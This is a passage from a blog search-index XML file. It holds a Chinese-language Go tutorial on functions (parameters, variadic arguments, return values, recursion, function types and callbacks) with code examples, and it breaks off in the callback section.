<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Golang学习之函数与工程管理</title>
    <link href="/p/8fdd12c0.html"/>
    <url>/p/8fdd12c0.html</url>
    
    <content type="html"><![CDATA[<h2 id="一、基础函数"><a href="#一、基础函数" class="headerlink" title="一、基础函数"></a>一、基础函数</h2><p>函数构成代码执行的逻辑结构。</p><h3 id="1-1-定义格式"><a href="#1-1-定义格式" class="headerlink" title="1.1 定义格式"></a>1.1 定义格式</h3><p>函数基本构成元素：由关键字 <code>func</code> 开头，紧接着是一个函数名 <code>FuncName</code>，然后才是参数列表、返回值、函数体和返回语句。（参数列表、返回值、返回语句是可选的）</p><h4 id="1-1-1-基本语法"><a href="#1-1-1-基本语法" class="headerlink" title="1.1.1 基本语法"></a>1.1.1 基本语法</h4><p>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FuncName</span><span class="hljs-params">(/*参数列表*/)</span> <span class="hljs-params">(o1 type1, o2 type2/*返回值：名称 数据类型*/)</span></span> &#123;<span class="hljs-comment">//函数体</span><span class="hljs-comment">//也就是这一块区域里的代码</span><span class="hljs-keyword">return</span> v1, v2 <span class="hljs-comment">//返回值</span>&#125;</code></pre><h4 id="1-1-2-定义格式的说明"><a href="#1-1-2-定义格式的说明" class="headerlink" title="1.1.2 定义格式的说明"></a>1.1.2 定义格式的说明</h4><h5 id="1-1-2-1-func"><a href="#1-1-2-1-func" class="headerlink" title="1.1.2.1 func"></a>1.1.2.1 func</h5><p><code>func</code> 是声明函数的关键字。</p><h5 id="1-1-2-2-函数名称"><a href="#1-1-2-2-函数名称" class="headerlink" title="1.1.2.2 函数名称"></a>1.1.2.2 函数名称</h5><p>函数名称采用<code>驼峰格式</code>命名。Golang 规定：<strong>函数名首字母小写即对外部不可见，函数名首字母大写即对外部可见</strong>。</p><h5 id="1-1-2-3-参数列表"><a href="#1-1-2-3-参数列表" class="headerlink" title="1.1.2.3 参数列表"></a>1.1.2.3 参数列表</h5><p>紧跟在函数名称后面的一对小括号 <code>()</code>，不管有没有参数，这对<strong>小括号 () 必须写上</strong>！<br>参数是可选的，可以是 0 个或者多个参数。参数格式为：<code>参数名 数据类型</code>。<br><strong>Golang 没有默认参数</strong>！</p><h5 id="1-1-2-4-返回值"><a href="#1-1-2-4-返回值" class="headerlink" title="1.1.2.4 返回值"></a>1.1.2.4 返回值</h5><p>可选。如果这个函数没有返回值，就直接省略最后的返回参数以及 <code>return</code> 语句。<br>如果只有一个返回值且没有声明返回值的名称，那么就可以省略不写返回值名称以及括号，直接在函数体中使用 <code>return</code> 语句把这个只有一个的返回值给返回出去。但返回值的数据类型必须写！同理 1.1.1 的示例中，返回值声明了两个变量名（返回参数名称）o1 和 o2，这个也不是必须写的，可以只写数据类型而不写返回参数名称。<br>注意：Golang 没有默认值，如果函数没有返回值，Golang 是不会返回任何内容。<strong>在Golang中，函数没有返回值，那就是真的没有任何内容会返回出来了！</strong><br>例：</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myFunc</span><span class="hljs-params">()</span></span> &#123;a := <span class="hljs-number">6</span>fmt.Println(<span class="hljs-string">&quot;a = &quot;</span>, a)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;myFunc()&#125;</code></pre><p>如果有返回参数，函数体内必须写上 <code>return</code> 语句。</p><h3 id="1-2-有参数无返回值函数（普通参数列表）"><a href="#1-2-有参数无返回值函数（普通参数列表）" class="headerlink" title="1.2 有参数无返回值函数（普通参数列表）"></a>1.2 有参数无返回值函数（普通参数列表）</h3><p><strong>Golang 函数参数都属于必备参数，调用时必须传给它实参</strong>！</p><h4 id="1-2-1-形参与实参"><a href="#1-2-1-形参与实参" class="headerlink" title="1.2.1 形参与实参"></a>1.2.1 形参与实参</h4><p>形参：定义函数时，函数的参数。<br>实参：调用函数时，传递过去的值。</p><pre><code class="hljs go"><span class="hljs-comment">//定义函数时，在函数第一个圆括号内定义的参数叫形成</span><span class="hljs-comment">//参数传递是单向传递，且只能由实参传递给形参，不能反过来</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">MyTest</span><span class="hljs-params">(a <span class="hljs-keyword">int</span>)</span></span> &#123;fmt.Println(<span class="hljs-string">&quot;a=&quot;</span>, a)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-comment">//调用函数时，传递过去的参数叫实参</span>MyTest(<span class="hljs-number">111</span>)&#125;</code></pre><h4 id="1-2-2-多个同类型参数的简写方式"><a href="#1-2-2-多个同类型参数的简写方式" class="headerlink" title="1.2.2 多个同类型参数的简写方式"></a>1.2.2 多个同类型参数的简写方式</h4><p>这样写非常简洁，但参数一多就容易发生混乱，到底这个参数是什么类型。</p><pre><code class="hljs go"><span class="hljs-comment">//都同类型参数的时候，可以简写</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">MyTest</span><span class="hljs-params">(a, b, c <span class="hljs-keyword">int</span>)</span></span> &#123;fmt.Printf(<span class="hljs-string">&quot;a=%d\tb=%d\tc=%d\t&quot;</span>, a, b, c)<span class="hljs-comment">//a=111b=222c=333</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;MyTest(<span class="hljs-number">111</span>, <span class="hljs-number">222</span>, <span class="hljs-number">333</span>)&#125;</code></pre><h4 id="1-2-3-多个不同类型参数列表的写法"><a href="#1-2-3-多个不同类型参数列表的写法" class="headerlink" title="1.2.3 多个不同类型参数列表的写法"></a>1.2.3 多个不同类型参数列表的写法</h4><p>参数多起来，建议每个参数都写明数据类型，这样不会造成数据类型弄错或忘记。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">MyTest</span><span class="hljs-params">(name <span class="hljs-keyword">string</span>, age <span class="hljs-keyword">int</span>, salary <span class="hljs-keyword">float64</span>)</span></span> &#123;fmt.Printf(<span class="hljs-string">&quot;name=%s\tage=%d\tsalary=%f\n&quot;</span>, name, age, salary)<span class="hljs-comment">//name=golangage=11salary=1234567890.000000</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;MyTest(<span class="hljs-string">&quot;golang&quot;</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1234567890</span>)&#125;</code></pre><h4 id="1-2-4-定义了几个参数，就必须传递几个值"><a href="#1-2-4-定义了几个参数，就必须传递几个值" class="headerlink" title="1.2.4 定义了几个参数，就必须传递几个值"></a>1.2.4 定义了几个参数，就必须传递几个值</h4><p>如果定义的是普通参数列表，定义了几个参数，就必须传递几个值过去，否则就报错！</p><h3 id="1-3-不定参数列表"><a href="#1-3-不定参数列表" class="headerlink" title="1.3 不定参数列表"></a>1.3 不定参数列表</h3><p>如果不知道到底会有几个参数，那么就可以用不定参数列表。不定参数列表是指函数传入的参数数量不确定，它是通过切片来实现的，且<strong>只能放在形参中的最后一个</strong>！</p><h4 id="1-3-1-不定参数类型的定义"><a href="#1-3-1-不定参数类型的定义" class="headerlink" title="1.3.1 不定参数类型的定义"></a>1.3.1 不定参数类型的定义</h4><p>首先将一个函数的形参定义为接受不定参数类型。<br>语法：<code>func FuncName(varName ...Type)</code>。（<code>...Type</code>其实就是一种语法糖，接收 0 个或者多个 Type 类型参数）</p><pre><code class="hljs go"><span class="hljs-comment">//...int就是不定参数类型，接收0个或者多个int参数</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myTest</span><span class="hljs-params">(a ...<span class="hljs-keyword">int</span>)</span></span> &#123;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;myTest(<span class="hljs-number">111</span>, <span class="hljs-number">222</span>)&#125;</code></pre><h4 id="1-3-2-不定参数的传参"><a href="#1-3-2-不定参数的传参" class="headerlink" title="1.3.2 不定参数的传参"></a>1.3.2 不定参数的传参</h4><p>此时，传递过去的实参可以是 0 个或者多个。</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-comment">//...int就是不定参数类型，接收0个或者多个int参数</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myTest</span><span class="hljs-params">(a ...<span class="hljs-keyword">int</span>)</span></span> &#123;fmt.Println(a)fmt.Printf(<span class="hljs-string">&quot;a type is : %T\n&quot;</span>, a)fmt.Println(<span class="hljs-string">&quot;--------------------------------&quot;</span>)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;myTest()myTest(<span class="hljs-number">1</span>)myTest(<span class="hljs-number">111</span>, <span class="hljs-number">222</span>)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">[]</span><span class="hljs-comment">a type is : []int</span><span class="hljs-comment">--------------------------------</span><span class="hljs-comment">[1]</span><span class="hljs-comment">a type is : []int</span><span class="hljs-comment">--------------------------------</span><span class="hljs-comment">[111 222]</span><span class="hljs-comment">a type is : []int</span><span class="hljs-comment">--------------------------------</span><span class="hljs-comment">*/</span></code></pre><p>可以看到，不定参数使用切片来实现。</p><h4 id="1-3-3-不定参数必须放在形参的最后面"><a href="#1-3-3-不定参数必须放在形参的最后面" class="headerlink" title="1.3.3 不定参数必须放在形参的最后面"></a>1.3.3 不定参数必须放在形参的最后面</h4><pre><code class="hljs go"><span class="hljs-comment">//注意：不定参数，一定（只能）放在形参中的最后一个参数</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myFunc03</span><span class="hljs-params">(args ...<span class="hljs-keyword">int</span>, a <span class="hljs-keyword">int</span>)</span></span> &#123;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;myFunc02(<span class="hljs-number">111</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果:</span><span class="hljs-comment"># command-line-arguments</span><span class="hljs-comment">.\32_不定参数类型.go:34:15: syntax error: cannot use ... with non-final parameter args</span><span class="hljs-comment">*/</span></code></pre><p>报错大意：<code>...</code> 在列表中只能作为最后一个参数。</p><h4 id="1-3-4-不定实参传递给另一个函数的不定形参"><a href="#1-3-4-不定实参传递给另一个函数的不定形参" class="headerlink" title="1.3.4 不定实参传递给另一个函数的不定形参"></a>1.3.4 不定实参传递给另一个函数的不定形参</h4><p>不定参数作为实参，传递给另外一个函数的不定形参，另一个函数的形参必须也是一个不定参数类型。</p><h5 id="1-3-4-1-基本示例"><a href="#1-3-4-1-基本示例" class="headerlink" title="1.3.4.1 基本示例"></a>1.3.4.1 基本示例</h5><pre><code class="hljs go"><span class="hljs-comment">//参数类型被定义为不定参数</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">f1</span><span class="hljs-params">(a ...<span class="hljs-keyword">int</span>)</span></span> &#123;f2(a...) <span class="hljs-comment">//不定参数作为实参，传递给目标函数</span>&#125;<span class="hljs-comment">//目标函数的形参也必须是不定参数类型</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">f2</span><span class="hljs-params">(a ...<span class="hljs-keyword">int</span>)</span></span> &#123;fmt.Printf(<span class="hljs-string">&quot;a type is : %T, a=%v\n&quot;</span>, a, a)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;f1(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">a type is : []int, a=[1 2 3 4 5]</span><span class="hljs-comment">*/</span></code></pre><h5 id="1-3-4-2-形参和实参都要加上"><a href="#1-3-4-2-形参和实参都要加上" class="headerlink" title="1.3.4.2 形参和实参都要加上..."></a>1.3.4.2 形参和实参都要加上<code>...</code></h5><p>目标函数的形参需要定义成不定参数类型，传递过去的实参后面也需要加上 <code>...</code>。<br>示例：</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-comment">//想要接受不定参数，这里的形参也必须定义成不定参数</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myFunc</span><span class="hljs-params">(tmps ...<span class="hljs-keyword">int</span>)</span></span> &#123;fmt.Println(tmps)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(args ...<span class="hljs-keyword">int</span>)</span></span> &#123;<span class="hljs-comment">//此处，想要把args全部传递给myFunc，需要这样写</span>myFunc(args...) <span class="hljs-comment">//所有的都传过去了。...不能忘</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;test(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">[1 2 3 4 5]</span><span class="hljs-comment">*/</span></code></pre><p>注意：传递过去的时候，第 12 行 args 后面的 <code>...</code> 不能忘。不定参数的类型是一个切片，不加 <code>...</code> 就是一个数组类型。在 Golang 中，数组和切片是不同类型。</p><h5 id="1-3-4-3-可以使用切片截取"><a href="#1-3-4-3-可以使用切片截取" class="headerlink" title="1.3.4.3 可以使用切片截取"></a>1.3.4.3 可以使用切片截取</h5><p>如果只想传递某几个元素过去，可以使用切片截取某个片段。<br>示例：</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-comment">//想要接受不定参数，这里的形参也必须定义成不定参数</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myFunc</span><span class="hljs-params">(tmps ...<span class="hljs-keyword">int</span>)</span></span> &#123;fmt.Println(tmps)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(args ...<span class="hljs-keyword">int</span>)</span></span> &#123;<span class="hljs-comment">//只想把元素2,3,4传递给myFunc</span>myFunc(args[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>]...) <span class="hljs-comment">//...不能忘</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;test(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">[2 3 4]</span><span class="hljs-comment">*/</span></code></pre><h3 id="1-4-无参有返回值"><a href="#1-4-无参有返回值" class="headerlink" title="1.4 无参有返回值"></a>1.4 无参有返回值</h3><p>有返回值的函数，在函数体内必须通过 <code>return</code> 返回。</p><h4 id="1-4-1-一个返回值"><a href="#1-4-1-一个返回值" class="headerlink" title="1.4.1 一个返回值"></a>1.4.1 一个返回值</h4><p>只有一个返回值，可以不写该返回值的名称。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> <span class="hljs-title">int</span></span> &#123; <span class="hljs-comment">//不给返回值起名称</span><span class="hljs-keyword">return</span> <span class="hljs-number">777</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;fmt.Println(test()) <span class="hljs-comment">//777</span>&#125;</code></pre><h4 id="1-4-2-多个返回值"><a href="#1-4-2-多个返回值" class="headerlink" title="1.4.2 多个返回值"></a>1.4.2 多个返回值</h4><p>有多个返回值的时候，官方推荐给每个返回值起个名字。<br>下面这种写法是官方推荐：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> <span class="hljs-params">(name <span class="hljs-keyword">string</span>, age <span class="hljs-keyword">int</span>)</span></span> &#123; <span class="hljs-comment">//每个返回值都起了名称</span><span class="hljs-comment">//函数中可以直接使用这及格返回值的名称</span>name = <span class="hljs-string">&quot;golang&quot;</span>age = <span class="hljs-number">11</span><span class="hljs-keyword">return</span> <span class="hljs-comment">//按照返回值参数定义的顺序，自动把name和age都给返回回去了</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;fmt.Println(test())<span class="hljs-comment">//golang 11</span>&#125;</code></pre><p><strong>Golang 是按照返回值参数定义的顺序进行返回</strong>。<br>使用 Goland 时，按住 <code>Ctrl</code>，鼠标移动到函数上的时候，就能清晰看到那个函数返回了哪些信息，信息更加明显：</p><h3 id="1-5-有参数有返回值"><a href="#1-5-有参数有返回值" class="headerlink" title="1.5 有参数有返回值"></a>1.5 有参数有返回值</h3><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">maxAndMin</span><span class="hljs-params">(a <span class="hljs-keyword">int</span>, b <span class="hljs-keyword">int</span>)</span> <span class="hljs-params">(max <span class="hljs-keyword">int</span>, min <span class="hljs-keyword">int</span>)</span></span> &#123;<span class="hljs-keyword">if</span> a &gt; b &#123;max = amin = b&#125; <span class="hljs-keyword">else</span> &#123;max = bmin = a&#125;<span class="hljs-keyword">return</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;max, min := maxAndMin(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>)fmt.Printf(<span class="hljs-string">&quot;max=%d, min=%d\n&quot;</span>, max, min)a, _ := maxAndMin(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>)fmt.Printf(<span class="hljs-string">&quot;max=%d&quot;</span>, a)&#125;</code></pre><h2 id="二、递归函数"><a href="#二、递归函数" class="headerlink" title="二、递归函数"></a>二、递归函数</h2><h3 id="2-1-普通函数调用流程"><a href="#2-1-普通函数调用流程" class="headerlink" title="2.1 普通函数调用流程"></a>2.1 普通函数调用流程</h3><p>先调用后返回，先进后出（<code>FILO</code>）。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcc</span><span class="hljs-params">(c <span class="hljs-keyword">int</span>)</span></span> &#123;fmt.Println(<span class="hljs-string">&quot;c = &quot;</span>, c)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcb</span><span class="hljs-params">(b <span class="hljs-keyword">int</span>)</span></span> &#123;funcc(b - <span class="hljs-number">1</span>)fmt.Println(<span class="hljs-string">&quot;b = &quot;</span>, b)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funca</span><span class="hljs-params">(a <span class="hljs-keyword">int</span>)</span></span> &#123;funcb(a - <span class="hljs-number">1</span>)fmt.Println(<span class="hljs-string">&quot;a = &quot;</span>, a)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;funca(<span class="hljs-number">3</span>) <span class="hljs-comment">//函数调用</span>fmt.Println(<span class="hljs-string">&quot;main&quot;</span>)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">c =  1</span><span class="hljs-comment">b =  2</span><span class="hljs-comment">a =  3</span><span class="hljs-comment">main</span><span class="hljs-comment">*/</span></code></pre><h3 id="2-2-递归函数的特性"><a href="#2-2-递归函数的特性" class="headerlink" title="2.2 递归函数的特性"></a>2.2 递归函数的特性</h3><p>递归函数可以直接或间接地调用自身，同样利用的是普通函数调用流程：先调用后返回、先进后出的特性。<br>递归函数通常有相同的结构：一个跳出条件和一个递归体。跳出条件就是根据传入的实参判断是否需要停止递归，递归体说白了就是包裹在函数体内的代码。</p><h3 id="2-3-递归函数调用流程"><a href="#2-3-递归函数调用流程" class="headerlink" title="2.3 递归函数调用流程"></a>2.3 递归函数调用流程</h3><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(a <span class="hljs-keyword">int</span>)</span></span> &#123;<span class="hljs-keyword">if</span> a == <span class="hljs-number">1</span> &#123; <span class="hljs-comment">//函数终止调用的条件，非常重要</span>fmt.Println(<span class="hljs-string">&quot;a = &quot;</span>, a)<span class="hljs-keyword">return</span> <span class="hljs-comment">//终止函数调用</span>&#125;<span class="hljs-comment">//函数调用自身</span>test(a - <span class="hljs-number">1</span>)fmt.Println(<span class="hljs-string">&quot;a = &quot;</span>, a)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;test(<span class="hljs-number">3</span>)fmt.Println(<span class="hljs-string">&quot;main&quot;</span>)&#125;</code></pre><h3 id="2-4-数字累加"><a href="#2-4-数字累加" class="headerlink" title="2.4 数字累加"></a>2.4 数字累加</h3><p>示例：</p><pre><code class="hljs go"><span class="hljs-comment">//实现1+2+3+...100</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span> <span class="hljs-params">(sum <span class="hljs-keyword">int</span>)</span></span> &#123;<span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">100</span>; i++ &#123;sum += i&#125;<span class="hljs-keyword">return</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test02</span><span class="hljs-params">(i <span class="hljs-keyword">int</span>)</span> <span class="hljs-params">(sum <span class="hljs-keyword">int</span>)</span></span> &#123;<span class="hljs-keyword">if</span> i == <span class="hljs-number">100</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-number">100</span>&#125;<span class="hljs-keyword">return</span> i + test02(i+<span class="hljs-number">1</span>)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> sum <span class="hljs-keyword">int</span>sum = test01() <span class="hljs-comment">//普通方法实现</span>fmt.Println(<span class="hljs-string">&quot;sum = &quot;</span>, sum)sum = test02(<span class="hljs-number">1</span>) <span class="hljs-comment">//递归实现</span>fmt.Println(<span class="hljs-string">&quot;sum = &quot;</span>, sum)&#125;</code></pre><h2 id="三、函数类型"><a href="#三、函数类型" class="headerlink" title="三、函数类型"></a>三、函数类型</h2><p>Golang中，函数也是一个数据类型：<strong>所有拥有相同的参数、相同的返回值的一种数据类型</strong>。</p><h3 id="3-1-大致流程"><a href="#3-1-大致流程" class="headerlink" title="3.1 大致流程"></a>3.1 大致流程</h3><h4 id="3-1-1-给函数起一个别名。"><a href="#3-1-1-给函数起一个别名。" class="headerlink" title="3.1.1 给函数起一个别名。"></a>3.1.1 给函数起一个别名。</h4><p>使用关键字 <code>type</code> 声明一个函数类型。<br>语法：<code>type 变量名 func(/*参数列表*/)</code>。例：<code>type myFunc func(int, int) int</code>。<br>注意：<strong>type 定义的函数类型，func() 后面不能接返回值和大括号</strong>。</p><h4 id="3-1-2-声明一个函数类型的变量名"><a href="#3-1-2-声明一个函数类型的变量名" class="headerlink" title="3.1.2 声明一个函数类型的变量名"></a>3.1.2 声明一个函数类型的变量名</h4><p>例：<code>var f myFunc</code>。声明一个变量，名称为 f，类型为 myFunc 函数类型。</p><h4 id="3-1-3-赋值给一个变量"><a href="#3-1-3-赋值给一个变量" class="headerlink" title="3.1.3 赋值给一个变量"></a>3.1.3 赋值给一个变量</h4><p>把某个同类型参数以及同类型返回值的函数体赋值给一个变量。<br>例：<code>f = add</code>。注意：这个 add 的参数数量和参数类型必须和 f 函数的类型一模一样！</p><h4 id="3-1-4-通过这个变量来调用函数"><a href="#3-1-4-通过这个变量来调用函数" class="headerlink" title="3.1.4 通过这个变量来调用函数"></a>3.1.4 通过这个变量来调用函数</h4><p>变量名+小括号+实参，实现调用。例：<code>f(10, 20)</code>。</p><h3 id="3-2-综合示例，演示多态的思想"><a href="#3-2-综合示例，演示多态的思想" class="headerlink" title="3.2 综合示例，演示多态的思想"></a>3.2 综合示例，演示多态的思想</h3><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Add</span><span class="hljs-params">(a, b <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int</span></span> &#123;<span class="hljs-keyword">return</span> a + b&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Minus</span><span class="hljs-params">(a, b <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int</span></span> &#123;<span class="hljs-keyword">return</span> a - b&#125;<span class="hljs-comment">//函数也是一种数据类型，通过type给一个函数类型起名</span><span class="hljs-comment">//FuncType它是一个函数类型</span><span class="hljs-keyword">type</span> FuncType <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int</span> //没有函数名字，没有</span>&#123;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> result <span class="hljs-keyword">int</span>result = Add(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>) <span class="hljs-comment">//传统调用方式</span>fmt.Println(<span class="hljs-string">&quot;result = &quot;</span>, result)<span class="hljs-comment">//声明一个函数类型的变量，变量名叫fTest</span><span class="hljs-keyword">var</span> fTest FuncTypefTest = Add            <span class="hljs-comment">//是变量就可以赋值</span>result = fTest(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>) <span class="hljs-comment">//等价于Add(10,20)</span>fmt.Println(<span class="hljs-string">&quot;result2 = &quot;</span>, result)fTest = Minusresult = fTest(<span class="hljs-number">10</span>, <span class="hljs-number">5</span>) <span class="hljs-comment">//等价于Minus(10, 5)</span>fmt.Println(<span class="hljs-string">&quot;result3 = &quot;</span>, result)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">result =  2</span><span class="hljs-comment">result2 =  30</span><span class="hljs-comment">result3 =  5</span><span class="hljs-comment">*/</span></code></pre><h2 id="四、回调函数"><a href="#四、回调函数" class="headerlink" title="四、回调函数"></a>四、回调函数</h2><p>所谓回调函数就是函数的参数里有一个参数是函数类型。</p><h3 id="4-1-大致流程"><a href="#4-1-大致流程" class="headerlink" title="4.1 大致流程"></a>4.1 大致流程</h3><p>1.定义一个函数类型。<br>2 函数形参指定为一个函数类型。定义另一个函数，函数的参数列表里放入刚才定义的函数类型。此时，这个函数就变成了回调函数。<br>3.在回调函数内部去调用其他不同的函数。</p><h3 id="4-2-综合示例"><a href="#4-2-综合示例" class="headerlink" title="4.2 综合示例"></a>4.2 综合示例</h3><pre><code class="hljs go"><span class="hljs-comment">//1.首先要定义一个函数类型</span><span class="hljs-keyword">type</span> myFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int</span></span><span class="hljs-comment">//每个函数的实现</span><span class="hljs-comment">//参数数量和数据类型以及返回值类型，要跟myFunc函数类型一模一样</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(a, b <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int</span></span> &#123;<span class="hljs-keyword">return</span> a + b&#125;<span class="hljs-comment">//每个函数的实现</span><span class="hljs-comment">//参数数量和数据类型以及返回值类型，要跟myFunc函数类型一模一样</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">minus</span><span class="hljs-params">(a, b <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int</span></span> &#123;<span class="hljs-keyword">return</span> a - b&#125;<span class="hljs-comment">//每个函数的实现</span><span class="hljs-comment">//参数数量和数据类型以及返回值类型，要跟myFunc指向的函数类型一模一样</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mul</span><span class="hljs-params">(a, b <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int</span></span> &#123;<span class="hljs-keyword">return</span> a * b&#125;<span class="hljs-comment">//2.定义一个回调函数。函数的参数列表里，funcName形参被指定为myFunc函数类型，此时Calc就是一个回调函数</span><span class="hljs-comment">//多态：多种形态。调用同一个接口，可以实现不同的功能</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Calc</span><span class="hljs-params">(a, b <span class="hljs-keyword">int</span>, funcName myFunc)</span> <span class="hljs-params">(result <span class="hljs-keyword">int</span>)</span></span> &#123;<span class="hljs-comment">//传过来就是add,minus,mul三个中的一个，funcName可以动态变成add或minus或mul，以实现不同的功能</span><span class="hljs-comment">//调用函数依然采用：函数名+小括号的方式调用，这里就可以根据实际传过来的函数名去动态调用，动态实现不同功能</span>result = funcName(a, b)<span class="hljs-comment">//return add(a, b) //这样就写死了，Calc这个函数只能实现add这个功能，而不能实现其他功能</span><span 